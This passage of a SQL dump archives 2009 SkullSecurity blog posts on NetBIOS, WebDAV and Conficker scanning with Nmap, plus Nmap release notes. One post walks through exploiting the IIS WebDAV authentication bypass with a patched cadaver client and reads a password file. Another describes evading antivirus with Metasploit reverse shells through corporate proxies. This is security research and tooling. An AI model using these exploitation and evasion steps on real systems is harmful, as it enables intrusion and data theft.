57  |KGROUP      ...W|\r\n00000070  4f 52 4b 47 52 4f 55 50  20 20 20 20 20 20 1e 84  |ORKGROUP      ..|\r\n00000080  00 57 4f 52 4b 47 52 4f  55 50 20 20 20 20 20 20  |.WORKGROUP      |\r\n00000090  1d 04 00 01 02 5f 5f 4d  53 42 52 4f 57 53 45 5f  |.....__MSBROWSE_|\r\n000000a0  5f 02 01 84 00 00 0c 29  03 8f 64 00 00 00 00 00  |_......)..d.....|\r\n000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n\nNote the list of names in the response, and also note the MAC address toward the end (00:0C:29:03:8F:64). \nResponse\nThe response has the identical header, except it sets the first flag (0x8000), and sets ANCOUNT to 1 instead of QDCOUNT (an answer instead of a question). The format of the answer is:\n\n(string) requested name, encoded\n(2 bytes)  query type\n(2 bytes)  query class\n(2 bytes)  time to live\n(2 bytes)  record length\n(1 byte)   number of names\n[for each name]\n\n(16 bytes) padded name, with a 1-byte suffix (not encoded)\n(2 bytes)  flags\n\n(variable) statistics (usually mac address)\n\nBasically, a list of the host\'s names are returned, with some flags. The last byte in the name, which I call the \'suffix\', represents the type of name. I don\'t know what all the types represent, just that 0x20 represents the server\'s name and 0x03 represents the current user. \nSo there you have it -- performing an nbstat call is actually very simple: build (or just hardcode) the static packet, send it on UDP/137, and parse the response. \nHappy hacking! :)', '\'NetBIOS/SMB\', \'Tools\'', 'https://blog.skullsecurity.org/2009/nbstatnse-a-replacement-for-nbtscan-and-others');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, 'WebDAV Detection, Vulnerability Checking and Exploitation', 'Andrew', '2009-5-20', 'Ahoy! My name is Andrew and I\'ve been playing with the recent IIS WebDAV authentication bypass vulnerability (CVE-2009-1676) and helping Ron with writing the nmap detection script (http-iis-webdav-vuln.nse) and testing it in the lab. Ron is in a meeting today so I thought I\'d jump in where he left off and post a bit about how to detect if WebDAV is enabled and how to actually exploit a folder once you\'ve determined it is vulnerable.\n\nThe first thing one should know when playing with this vulnerability is that the IIS server is not exploitable if the root folder is protected. Also if the root folder is protected, there is no way to determine if WebDAV is even enabled. That being said, if the root folder is _not_ protected then it\'s time to break out the funky cold medina and have some fun.\nDetecting if WebDAV is enabled\nTested working on\n * IIS 6.0/Windows 2003 Enterprise SP2\n * IIS 5.1/Windows XP Pro SP2\n * IIS 5.0/Windows 2000 SP4\nOn IIS 6.0, WebDAV is disabled by default. On IIS 5.0 and 5.1, WebDAV is enabled by default and you must edit the registry to disable it.\nMy method of detection simply involves running a PROPFIND request on the server. This is the same basic PROPFIND request we used in the http-iis-webdav-vuln.nse script:\n\r\nPROPFIND / HTTP/1.1\r\nHost: xxx.xxx.xxx.xxx\r\nContent-Type: application/xml\r\nContent-Length: 298\r\n\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<propfind xmlns=\"DAV:\">\r\n<prop>\r\n<getcontentlength xmlns=\"DAV:\"/>\r\n<getlastmodified xmlns=\"DAV:\"/>\r\n<executable xmlns=\"http://apache.org/dav/props/\"/>\r\n<resourcetype xmlns=\"DAV:\"/>\r\n<checked-in xmlns=\"DAV:\"/>\r\n<checked-out xmlns=\"DAV:\"/>\r\n</prop>\r\n</propfind>\r\n\nWhen WebDAV is enabled, it should return \"HTTP/1.1 207 Multi-Status\".\nWhen WebDAV has been disabled, it should return \"HTTP/1.1 501 Not Supported\".\nThis is the method I\'ve implemented in the http-iis-webdav-vuln.nse script. It works great in the lab on IIS servers. If we get back anything other than a 207 or 501 then we jump ship saying the web server is not supported. An Ubuntu server running Apache returns a 405 Method Not Allowed for instance.\nChecking if a server is vulnerable\nTested working on\n * IIS 6.0/Windows 2003 Enterprise SP2\n * IIS 5.1/Windows XP Pro SP2\nTested not working on\n * IIS 5.0/Windows 2000 SP4\nThe original script only used one type of check; it would first find a protected folder (/secret/) and then try inserting the %c0%af character after the first /. It would turn /secret/ into /%c0%afsecret/.\nThis worked fine on IIS 6.0 but did not work at all on IIS 5.0/5.1. After playing with it some more today, we managed to get it working on IIS 5.1. The trick with 5.1 is that the %c0%af character can not be right after the / but must be somewhere in the middle of the folder name. This also works on IIS 6.0. I modified the script so that it uses the 5.1/6.0 check, turning /secret/ into /s%c0%afecret/.\nFinding a vulnerable server\nTested working on\n * IIS 6.0/Windows 2003 Enterprise SP2\n * IIS 5.1/Windows XP Pro SP2\nTested not working on\n * IIS 5.0/Windows 2000 SP4\nNow for the fun part. If you havent turned on some funky cold medina yet, get to it because we\'re almost done!\nFirst thing we need to do is find a vulnerable server. I just happen to know of a Windows 2003 box in my lab running IIS 6.0 that is vulnerable (fully patched up to today btw). Lets see how an nmap scan of this box with the updated script works out:\n\r\n> ./nmap -T4 -p80 --script=http-iis-webdav-vuln xxx.xxx.xxx.xxx\r\n\r\nStarting Nmap 4.85BETA9 ( http://nmap.org ) at 2009-05-20 14:29 CDT\r\nInteresting ports on xxx.xxx.xxx.xxx:\r\nPORT   STATE SERVICE\r\n80/tcp open  http\r\n|_ http-iis-webdav-vuln: WebDAV is ENABLED. Vulnerable folders discovered: /private, /secret, /webdav\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 21.41 seconds\r\n\nInteresting! So now we know the server has WebDAV enabled and that there are three vulnerable folders.\nExploiting it!\nNow we could do everything by telnet-ing over port 80, but that\'s not much fun (believe me, it\'s very tedious!) so I went looking for a WebDAV client. I stumbled upon a FOSS one called cadaver, and based purely on the name I grabbed it. Now cadaver itself is a great little command line WebDAV client but I quickly realized it has a bunch of problems that won\'t let us do what we wanted. The nice thing about FOSS is that it\'s open, so we grabbed the cadaver-0.23.2 source and after hacking away at it for awhile, we came up with a little patch that makes it quite easy to exploit a server. Check the patch itself for the gritty details but basically it does the following:\n1) Replace any \"Depth: 0\" header with \"Depth: 1\" (otherwise ls won\'t work)\n2) Append the header \"Translate: f\" to every request (otherwise get and probably others won\'t work)\n3) Insert the characters \"%c0%af\" into any uri request longer than 1 character.\nSo, grab the cadaver-0.23.2-h4x.patch and apply it to the cadaver-0.23.2 source from the cadaver website. Here\'s the commands:\n\r\n> mkdir cadaver-h4x\r\n> cd cadaver-h4x\r\n> wget http://www.skullsecurity.org/blogdata/cadaver-0.23.2-h4x.patch\r\n--snip--\r\n> wget http://www.webdav.org/cadaver/cadaver-0.23.2.tar.gz\r\n--snip--\r\n> tar xzvf cadaver-0.23.2.tar.gz\r\n--snip--\r\n> cd cadaver-0.23.2/\r\n> patch -p1 < ../cadaver-0.23.2-h4x.patch\r\npatching file lib/neon/ne_basic.c\r\npatching file lib/neon/ne_request.c\r\npatching file lib/neon/ne_uri.c\r\n> ./configure\r\n--snip--\r\n> make\r\n--snip--\r\n\nNow we should have a patched, compiled version of cadaver, so start it up with the server that was identified as having a vulnerable folder earlier:\n\r\n> ./cadaver xxx.xxx.xxx.xxx\r\n\nThis should drop you to a \"dav:/>\" prompt. Now just cd into the vulnerable folder and check out what\'s there:\n\r\ndav:/> cd secret\r\ndav:/secret/> ls\r\nListing collection `/secret/\': succeeded.\r\n        password.txt                           7  May 19 10:40\r\ndav:/secret/> cat password.txt\r\nDisplaying `/secret/password.txt\':\r\nron$pr0ns\r\ndav:/secret/>\r\n\nAnd there you have it!\nHere\'s a list of commands that I\'ve tested that work with the patched cadaver on a vulnerable folder:\n * CD\n * LS\n * MOVE\n * PUT\n * GET\n * CAT\n * DELETE\nOddly enough, the COPY command does NOT work. We didn\'t have time to investigate why, but the functionality can be duplicated by a get/local rename/put.\nAlso, this patched cadaver will not work for browsing regular WebDAV folders (non-vulnerable), so don\'t try.\nIf anyone has been able to successfully exploit this on IIS 5.0 (Windows 2000), please contact me, we\'ve been trying and can\'t get it to work in the lab here.\nComments are welcome, you can also contact me by e-mail: andrew at andreworr dot ca', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (103, 'WebDAV Scanning with Nmap', 'Ron Bowes', '2009-5-19', 'Greetings!\nThis morning I heard (from the security-basics mailing list, of all places) that there\'s a zero-day vulnerability going around for WebDAV on Windows 2003. I always like a good vulnerability early in the week, so I decided to write an Nmap script to find it!\n\nThe first open script I found was Metasploit\'s, so I had a look at how that works. It was so simple, I didn\'t even have to look at the source -- a packet capture was enough.\nRead the module documentation\nHow do I use it?\nAt a high level, all you need to do is Update Nmap from SVN and run it with the following command:\n--script=http-iis-webdav-vuln\nIn more detail...\nObtaining Nmap from SVN\nRun the following command:\nsvn co --username guest --password \"\" svn://svn.insecure.org/nmap/\nThen compile it:\ncd nmap\r\n./configure\r\nmake\r\nsudo make install\r\n\nWhat if I don\'t have SVN?\nThen you\'re doing it the hard way...\n\nMake sure you\'re at \nNmap 4.85 beta 9 or higher.\nFind the script http.lua. It\'ll be in a folder called \'nselib\'; for example, /usr/local/share/nmap/nselib/http.lua. Replace it with this version. \nIn that folder (nselib), there\'s a directory called \'data\'. Put folders.lst in it. \nGo up one directory, and there should be a directory called \'scripts\'; for example, /usr/local/share/nmap/scripts. Put http-iis-webdav-vuln.nse in it. \n\nOnce you\'ve done all that, you\'re good to go.\nHow do I run it?\nRunning it is as simple as running Nmap itself. Here\'s the simplest case:\nnmap -sV --script=http-iis-webdav-vuln <target>\nEvery port running HTTP should be probed, but it\'ll take awhile. For a quicker check, try this:\nnmap -p80,8080 --script=http-iis-webdav-vuln <target>\nBut keep in mind that it\'ll only check the two most common ports for Web servers.\nFinally, if you know the name of a password-protected folder on the system, provide it directly:\nnmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=secret <target>\nor\nnmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=\\\"my/folder/secret\\\" <target>\n(note the backslashes -- they may not be required in the future)\nHow accurate is it?\nThis script relies on finding a password-protected folder, so it won\'t be 100% accurate. I have a list of around 850 common folder names, but that definitely won\'t find everything.\nIf you provide a folder name yourself using the webdavfolder argument, you\'re going to have a lot more luck. As far as I know, once it has the name of a real password-protected folder, it\'s 100% reliable. The trick is finding one.\nUnfortunately, there doesn\'t appear to be a good way to check if a server has WebDAV enabled. So, there\'s no easy check that I know of.\nHow does it work?\nThis is the part I like -- how does it work?\nWell, the answer is simple -- it works the same as the Metasploit Auxiliary module. Here\'s what it does:\nStep 1: Find a password protected folder\nI have a great big list of folders from a long time ago. I honestly don\'t know where I got it from, but if you created it and want credit, just hit me up. If you created it and you\'re pissed off that I stole it.. well, don\'t hit me up. :) -- But seriously, I don\'t want to take away anybody\'s credit, so let me know.\nAnyway, it checks the error code for each folder. If the error is 404 Not Found or 200 OK, we don\'t care. In fact, we care about very little -- we\'re only looking for one error code: 401 Unauthorized.\nStep 2: Exploit it!\nAfter we find a password-protected folder, there\'s only one thing left to do: exploit it! This is done by putting a Unicode-encoded string at the beginning of the URL. Thus, \"/private\" becomes \"/%c0%afprivate\". If the error remains 401 Unauthorized, the server is not vulnerable (it may be non-IIS6, or it may not be using WebDAV). If the error becomes 207 Multi-status, we\'re vulnerable! That\'s it!\nThe script will list all folders found to be vulnerable.\nHow do I exploit it for real?\nThat\'s a great question! But, my answer is a cop out right now: I\'ll get back to you. I suspect that it\'s possible (and easy) to exploit with free tools, such as Paros and the freely available portion of Burp Suite, but I haven\'t had a chance to try it out. When I do, I\'ll post a new blog!', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2009/webdav-scanning-with-nmap');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (104, 'Bypassing AV over the Internet with Metasploit', 'Matt Gardenghi', '2009-5-15', 'I performed all of this to learn more about data exfiltration, remote control, etc... over a tightly controlled corp environment.  It was depressing actually....  It\'s far too easy to gain control of a corp network even one that is conscientious.  This work is built on the info at  metasploit.com.\nOh, let me just say thanks for Metasploit.  Words fail to describe how nice this project is.  Thanks guys.\nSo, I want to share what I\'ve learned and offer some thoughts for pondering.\n\nAttacker Setup:\n- Wireless router with a Verizon Wireless card (EVDO) as the link to the internet.  This means I have a single IP, that it changes, and that my laptop is NATted on the inside of the router.\n- Laptop with BT 4 installed.\nVictim Setup:\n- Corp network has a restrictive FW that denies all outbound by default.\n- Corp has a proxy; if it can\'t be proxied, it doesn\'t happen.\n- Desktop has direct out through the FW and bypassing the proxy.\n- Multiple VMs on desktop have various configurations.  Some are NATted allowing for them to have direct out, others are bridged and use the proxy and abide by the standard FW rules.\n- Symantec Endpoint Protection Manager (SAV 11) on the victim\'s machine.\nCaveat:\nAs the attacker has to be NATted due to the nature of the Verizon wireless card, some tweaks were made to the tutorial created by HD Moore.  HD Moore\'s instructions create a payload that communicates directly with the IP of the attacker; the msfconsole setup binds to the same IP.  Obviously that doesn\'t work with NAT.  So, I set port forwarding on the router.  Then the first payload connects to the router\'s IP and is forwarded to the internal NATted address.  The msfconsole binds to the local IP and receives the connection.\nTesting:\nStep 1.   Testing with a direct out to learn how this works.\nShikata_ga_nai completely blows AV away.  So the real test here is whether I can communicate with my payload over the internet.\nI followed the cheat sheet found at the end of this to post to set up a basic reverse_tcp connection.  It works.  Well, it did work after I changed the IP in the payload.  Apparently the IP for my router was changed by Verizon right after I checked the IP....  That made my test fail for awhile, but I got over that.  :-)\nStep 2.\nI set up a VM network.  I have a PFSense FW that is NATted on the WAN side (granting it the same outbound access as the main desktop) and it serves DHCP on the LAN.  The FW only allows outbound TCP on ports 80, 443.  I then setup a XP Pro VM on the LAN side of the FW.\nI re-ran the tests and found that it worked fine.  I wanted to see how the whole process worked when I could control the FW.  On the main desktop with the corp FW, I can\'t touch and manipulate the FW.  This gave me a more controlled area for testing.\nEverything worked fine.  The payload reached out over the ports I instructed and connected to my attacking machine as planned.\nStep 3.\nNew VM bridged to the network.  This VM looks much more like a standard corp image which uses the proxy and standard FW ruleset.\nNow, since this machine cannot connect directly out on port 80 (that\'s blocked), it needs to be routed through the proxy.  So, I switched to reverse_http.  Which of course, ran into some significant problems.  It\'s like working on the car or the house, it never goes smoothly.  Something always decides to break even in the simplest of projects.  :-)\nSo, next I set the PXHOST, PXURI, and PXPORT on the payload to be executed on the victim.  Then I fired up the console and set the PXHOST to the local NATed IP as before.  When the payload executed, the victim connected to the console and downloaded the DLL.  Then nothing happened.\nI pushed the button a few more times.  Grrr.  No luck.\nI wiresharked the victim and discovered that the original payload called http://Public IP/URI which is then forwarded to the internal BT box.  The new code though, called http://Private IP/URI because that was the IP that the console new about.  Consequently, the victim attempts to contact the internal/non-routable IP address.\nFAIL.\nConclusion (or Here\'s what I\'ve learned so far):\nIf there is no proxy involved and port 80 outbound is open, then you can just reach out and use reverse TCP.  If there is a proxy, then you need to utilize reverse_http.  This is a non-issue unless of course you have a NATted IP like myself.  How do we fix this?  It would seem simplest to have PXHOST1 and PXHOST2.  PXHOST1 is the routable IP that is included in the payload for the victim.  We want them to reach out to that IP which will be port-forwarded to our local attack machine.  The PXHOST2 would be our local IP to which the exploit binds.  This should solve lots of problems.  First it covers the whole NAT issue, and second, it doesn\'t increase the load on a victim machine.  (Third it should be relatively easy for someone to code.  Takers anyone?)\nIt would be really cool, if the PXHOST/LHOST in the exploit code we sent out to the victim to start the process could handle DNS lookups.  Then I could feed the DynDNS entry for my router to the code and not have to worry about time sensitive exploits.  During a long pentest, I\'d want some code that lasted longer than 4 hours.  I guess the answer to that is a static IP, which I have in many circumstances though by no means all of them.\nAnyone know how to get my code to re-execute?  i.e. become sticky?  I guess, I could bind the Metasploit payload to an executable ZIP.  One that opens, runs a batch script that migrates the payload to a separate directory and attempts to schedule it with AT, then executes the payload immediately before cleaning itself up.  Other than that, I have no idea how to make it sticky.\nComments, suggestions, improvements?\nMy cheat sheet.', '\'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2009/bypassing-av-over-the-internet-with-metasploit');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (105, 'Nmap 4.85beta9 released', 'Ron Bowes', '2009-5-15', 'In case you haven\'t heard, Fyodor released Nmap 4.85beta9 this week. This is the first release in awhile that wasn\'t related to my code (or, most properly, mistakes :) ). It looks like the new stable version will be here soon, so give this one a shot and report your bugs. Here\'s the download page.\n\nFrom: Fyodor \r\nDate: Tue, 12 May 2009 20:44:56 -0700\r\n\r\nHello everyone! I\'m pleased to announce the first Nmap release in a\r\nwhile which has NOTHING to do with Conficker :). Nmap 4.85BETA9\r\nbrings you a bunch of other great stuff instead. This includes a big\r\nOS fingerprint submission run, a bunch of work to make Ncat SSL\r\nsupport more functional and secure, boolean arguments and wildcards\r\nfor scripts so you can now request stuff like \"--script \'(default or\r\nsafe or intrusive) and not http-*\'\", Ncat HTTP proxy support on\r\nWindows, Zenmap UI improvements, and much more! We also fixed some\r\nembarrassing bugs from the last release, such as the non-existent\r\nsmb-check-vulns-2.nse appearing in script.db and a number of\r\ndiscovered crashes. Not bad for a few weeks\' work :).\r\n\r\nYou can download 4.85BETA9 at the normal location:\r\n\r\nhttp://nmap.org/download.html\r\n\r\nDo give it some thorough testing! I\'d like to stabilize things so\r\nthat we can finally put out a stable version rather than endless\r\nBETAs! The best way to help with that is testing, bug reporting, and\r\nbug fixing! See http://nmap.org/book/man-bugs.html.\r\n\r\nWithout further ado, here is the full list of significant changes:\r\n\r\nNmap 4.85BETA9 [2009-05-12]\r\n\r\no Integrated all of your 1,156 of your OS detection submissions and\r\n  your 50 corrections since January 8. Please keep them coming! The\r\n  second generation OS detection DB has grown 14% to more than 2,000\r\n  fingerprints! That is more than we ever had with the first system.\r\n  The 243 new fingerprints include Microsoft Windows 7 beta, Linux\r\n  2.6.28, and much more. See\r\n  http://seclists.org/nmap-dev/2009/q2/0335.html. [David]\r\n\r\no [Ncat] A whole lot of work was done by David to improve SSL\r\n  security and functionality:\r\n  o Ncat now does certificate domain and trust validation against\r\n    trusted certificate lists if you specify --ssl-verify.\r\n  o [Ncat] To enable SSL certificate verification on systems whose\r\n    default trusted certificate stores aren\'t easily usable by\r\n    OpenSSL, we install a set of certificates extracted from Windows\r\n    in the file ca-bundle.crt. The trusted contents of this file are\r\n    added to whatever default trusted certificates the operating\r\n    system may provide. [David]\r\n  o Ncat now automatically generates a temporary keypair and\r\n    certificate in memory when you request it to act as an SSL server\r\n    but you don\'t specify your own key using --ssl-key and --ssl-cert\r\n    options. [David]\r\n  o [Ncat] In SSL mode, Ncat now always uses secure connections,\r\n    meaning that it uses only good ciphers and doesn\'t use\r\n    SSLv2. Certificates can optionally be verified with the\r\n    --ssl-verify and --ssl-trustfile options. Nsock provides the\r\n    option of making SSL connections that prioritize either speed or\r\n    security; Ncat uses security while version detection and NSE\r\n    continue to use speed. [David]\r\n\r\no [NSE] Added Boolean Operators for --script. You may now use (\"and\",\r\n  \"or\", or \"not\") combined with categories, filenames, and wildcarded filenames\r\n  to match a set files. Parenthetical subexpressions are allowed for\r\n  precedence too. For example, you can now run:\r\n\r\n  nmap --script \"(default or safe or intrusive) and not http-*\" scanme.nmap.org\r\n\r\n  For more details, see\r\n  http://nmap.org/book/nse-usage.html#nse-args. [Patrick]\r\n\r\no [Ncat] The HTTP proxy server now works on Windows too. [David]\r\n\r\no [Zenmap] The command wizard has been removed. The profile editor has\r\n  the same capabilities with a better interface that doesn\'t require\r\n  clicking through many screens. The profile editor now has its own\r\n  \"Scan\" button that lets you run an edited command line immediately\r\n  without saving a new profile. The profile editor now comes up\r\n  showing the current command rather than being blank. [David]\r\n\r\no [Zenmap] Added an small animated throbber which indicates that a\r\n  scan is still running (similar in concept to the one on the\r\n  upper-right Firefox corner which animates while a page is\r\n  loading). [David]\r\n\r\no Regenerate script.db to remove references to non-existent\r\n  smb-check-vulns-2.nse. This caused the following error messages when\r\n  people used the --script=all option: \"nse_main.lua:319:\r\n  smb-check-vulns-2.nse is not a file!\" The script.db entries are now\r\n  sorted again to make diffs easier to read. [David,Patrick]\r\n\r\no Fixed --script-update on Windows--it was adding bogus backslashes\r\n  preceding file names in the generated script.db. Reported by\r\n  Michael Patrick at http://seclists.org/nmap-dev/2009/q2/0192.html,\r\n  and fixed by Jah. The error message was also improved.\r\n\r\no The official Windows binaries are now compiled with MS Visual C++\r\n  2008 Express Edition SP1 rather than the RTM version. We also now\r\n  distribute the matching SP1 version of the MS runtime components\r\n  (vcredist_x86.exe). A number of compiler warnings were fixed\r\n  too. [Fyodor,David]\r\n\r\no Fixed a bug in the new NSE Lua core which caused it to round\r\n  fractional runlevel values to the next integer. This could cause\r\n  dependency problems for the smb-* scripts and others which rely on\r\n  floating point runlevel values (e.g. that smb-brute at runlevel 0.5\r\n  will run before smb-system-info at the default runlevel of 1).\r\n\r\no The SEQ.CI OS detection test introduced in 4.85BETA4 now has some\r\n  examples in nmap-os-db and has been assigned a MatchPoints value of\r\n  50. [David]\r\n\r\no [Ncat] When using --send-only, Ncat will now close the network\r\n  connection and terminate after receiving EOF on standard input.\r\n  This is useful for, say, piping a file to a remote ncat where you\r\n  don\'t care to wait for any response. [Daniel Roethlisberger]\r\n\r\no [Ncat] Fix hostname resolution on BSD systems where a recently\r\n  fixed libc bug caused getaddrinfo(3) to fail unless a socket type\r\n  hint is provided. Patch originally provided by Hajimu Umemoto of\r\n  FreeBSD. [Daniel Roethlisberger]\r\n\r\no [NSE] Fixed bug in the DNS library which caused the error message\r\n  \"nselib/dns.lua:54: \'for\' limit must be a number\". [Jah]\r\n\r\no Fixed Solaris 10 compilation by renaming a yield structure which\r\n  conflicted with a yield function declared in unistd.h on that\r\n  platform. [Pieter Bowman, Patrick]\r\n\r\no [Ncat] Minor code cleanup of Ncat memory allocation and string\r\n  duplication calls. [Ithilgore]\r\n\r\no Fixed a bug which could cause -iR to only scan the first host group\r\n  and then terminate prematurely. The problem related to the way\r\n  hosts are counted by o.numhosts_scanned. [David]\r\n\r\no Fixed a bug in the su-to-zenmap.sh script so that, in the cases\r\n  where it calls su, it uses the proper -c option rather than\r\n  -C. [Michal Januszewski, Henry Gebhardt]\r\n\r\no Overhaul the NSE documentation \"Usage and Examples\" section and add\r\n  many more examples: http://nmap.org/book/nse-usage.html [David]\r\n\r\no [NSE] Made hexify in nse_nsock.cc take an unsigned char * to work\r\n  around an assertion in Visual C++ in Debug mode. The isprint,\r\n  isalpha, etc. functions from ctype.h have an assertion that the\r\n  value of the character passed in is <= 255. If you pass a character\r\n  whose value is >= 128, it is cast to an unsigned int, making it a\r\n  large positive number and failing the assertion. This is the same\r\n  thing that was reported in\r\n  http://seclists.org/nmap-dev/2007/q2/0257.html, in regard to\r\n  non-ASCII characters in nmap-mac-prefixes. [David]\r\n\r\no [NSE] Fixed a segmentation fault which could occur in scripts which\r\n  use the NSE pcap library. The problem was reported by Lionel Cons\r\n  and fixed by Patrick.\r\n\r\no [NSE] Port script start/finish debug messages now show the target\r\n  port number as well as the host/IP. [Jah]\r\n\r\no Updated IANA assignment IP list for random IP (-iR)\r\n  generation. [Kris]\r\n\r\no [NSE] Fixed http.table_argument so that user-supplied HTTP headers\r\n  are now properly sent in HTTP requests. [Jah]\r\n\r\nEnjoy the new release!\r\n-Fyodor', '\'Tools\'', 'https://blog.skullsecurity.org/2009/nmap-485beta9-released');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (106, 'Scanning for Conficker’s peer to peer', 'Ron Bowes', '2009-4-21', 'Hi everybody,\nWith the help of Symantec\'s Security Intelligence Analysis Team, I\'ve put together a script that\'ll detect Conficker (.C and up) based on its peer to peer ports. The script is called p2p-conficker.nse, and automatically runs against any Windows system when scripts are being used:\nnmap --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=safe=1 -T4 -p445 <host>\r\nor\r\nsudo nmap -sU -sS --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=safe=1 -T4 -p U:137,T:139 <host>\nSee below for more information! \nOr, if you just want to scan your network fast, give this a shot:\nnmap -p139,445 --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=checkconficker=1,safe=1 -T4 <host>\n\nOfficial Nmap announcement\nOfficial Symantec announcement\n\n\nHow do I get it?\nUpdate to the newest Nmap SVN version, download the .nse file (info) and put it in your \'scripts\' folder, or download and install Nmap 4.85beta8 or higher. \nHow do I know if I\'m infected?\nFour tests are performed. If any of those tests come back INFECTED, you\'re probably infected. For example:\nHost script results:\r\n|  p2p-conficker: Checking for Conficker.C or higher...\r\n|  | Check 1 (port 21249/tcp): INFECTED (Received valid data)\r\n|  | Check 2 (port 25561/tcp): INFECTED (Received valid data)\r\n|  | Check 3 (port 26106/udp): INFECTED (Received valid data)\r\n|  | Check 4 (port 46447/udp): INFECTED (Received valid data)\r\n|_ |_ 4/4 checks: Host is likely INFECTED\r\n\nThat would indicate a host that\'s definitely infected. But even if only one of the ports came back, you are still infected:\nHost script results:\r\n|  p2p-conficker: Checking for Conficker.C or higher...\r\n|  | Check 1 (port 21249/tcp): INFECTED (Received valid data)\r\n|  | Check 2 (port 25561/tcp): CLEAN (Couldn\'t connect)\r\n|  | Check 3 (port 26106/udp): CLEAN (Failed to receive data)\r\n|  | Check 4 (port 46447/udp): CLEAN (Failed to receive data)\r\n|_ |_ 1/4 checks: Host is likely INFECTED\r\n\nAnd finally, if one or more ports come back with a possible infection (invalid data or an incorrect checksum), you should be cautious -- it could indicate an infection and a flaky network or a different generation of the worm (what are the chances of two random ports being open?) This might look like this:\nHost script results:\r\n|  p2p-conficker: Checking for Conficker.C or higher...\r\n|  | Check 1 (port 21249/tcp): CLEAN (Data received, but checksum was invalid (possibly INFECTED))\r\n|  | Check 2 (port 25561/tcp): CLEAN (Data received, but checksum was invalid (possibly INFECTED))\r\n|  | Check 3 (port 26106/udp): CLEAN (Failed to receive data)\r\n|  | Check 4 (port 46447/udp): CLEAN (Failed to receive data)\r\n|_ |_ 0/4 checks: Host is CLEAN or ports are blocked\nIf it says I\'m clean, how sure is it?\nUnfortunately, this check, like my other Conficker check, isn\'t 100% reliable. There are several factors here:\n\nThis peer to peer first appeared in Conficker.C, so Conficker.A and Conficker.B won\'t be detected\nIt relies on connecting to Conficker\'s ports -- firewalls or port filters can block this\nIf the host is multihomed or NATed, the wrong ports will be generated. If you know its real IP, see the sample commands below\nIf the Windows ports are blocked (445/139), the check won\'t run by default. This behaviour can be overridden, see the sample commands below\n\nHow does this work?\nWhen Conficker.C or higher infects a system, it opens four ports for communication (two TCP and two UDP). It uses these to connect to other infected hosts to send/receive updates and other information. These ports are based on two factors: a) the IP address, and b) the current time (the weeks since Jan 1 1970). \nThanks to research by Symantec (and others), the port-generation algorithm and the protocol have been discovered, and that\'s what I implemented in my script. Each packet has an encryption key, some data and a checksum (encrypted), and some noise. By sending a packet to an infected host on any of its ports, the host will respond. That response indicates an infection. \nFor more details on how it works, see the code itself. \nSample commands\nPerform a simple check:\nnmap --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=safe=1 -T4 -p445 <host>\r\nor\r\nsudo nmap -sU -sS --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=safe=1 -T4 -p U:137,T:139 <host>\nThis is probably the best way to run a fast scan. It does a ping sweep then scans every host:\nnmap -p139,445 --script p2p-conficker,smb-os-discovery,smb-check-vulns \\\r\n        --script-args=checkconficker=1,safe=1 -T4 <host>\nCheck all 65535 ports to see if any have been opened by Conficker (VERY slow, but thorough):\nnmap --script p2p-conficker,smb-os-discovery,smb-check-vulns -p- \\\r\n        --script-args=checkall=1,safe=1 -T4 <host>\nCheck the standard Conficker ports for a chosen IP address (in other words, override the IP address that\'s used to generate the ports):\nnmap --script p2p-conficker,smb-os-discovery -p445 \\\r\n        --script-args=realip=\\\"192.168.1.65\\\" -T4 <host>\nBut wait, there\'s more!\nsmb-check-vulns.nse can now detect Conficker.D (and .E) using the same techniques as scs2.py. \nConclusion\nHopefully the script helps you out! And, as usual, don\'t hesitate to contact me if you have any issues! You can find me in a bunch of places:\n\nPost a comment here (I try hard to answer every comment)\nPost a message to Nmap-dev\nEmail me (ron --- skullsecurity.org)\n#nmap on FreeNode (I don\'t look at that so often, though)', '\'Malware\', \'Tools\'', 'https://blog.skullsecurity.org/2009/scanning-for-confickers-peer-to-peer');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (107, 'Updated Conficker detection', 'Ron Bowes', '2009-4-2', 'Morning, all! \nLast night Fyodor and crew rolled out Nmap 4.85beta7. This was because some folks from the Honeynet Project discovered a false negative (showed no infection where an infection was present), which was then confirmed by Tenable. We decided to be on the safe side, and updated our checks.\n\n4.85 also contains several bugfixes and enhancements, such as improved error messages. We tried to find the biggest issues people were having and solve them. Here are the full release notes from Fyodor:\nNmap 4.85BETA7 [2009-04-1]\r\n\r\no Improvements to the Conficker detection script (smb-check-vulns):\r\n  o Treat any NetPathCanonicalize()return code of 0x57 as indicative\r\n    of a vulnerable machine. We (and all the other scanners) used to\r\n    require the 0x57 return code as well as a canonicalized path\r\n    string including 0x5c450000.  Tenable confirmed an infected\r\n    system which returned a 0x00000000 path, so we now treat any\r\n    return code of 0x57 as indicative of an infection. [Ron]\r\n  o Add workaround for crash in older versions of OpenSSL which would\r\n    occur when we received a blank authentication challenge string\r\n    from the server.  The error looked like: evp_enc.c(282): OpenSSL\r\n    internal error, assertion failed: inl > 0\". [Ron]\r\n  o Add helpful text for the two most common errors seen in the\r\n    Conficker check in smb-check-vulns.nse.  So instead of saying\r\n    things like \"Error: NT_STATUS_ACCESS_DENIED\", output is like:\r\n    |  Conficker: Likely CLEAN; access was 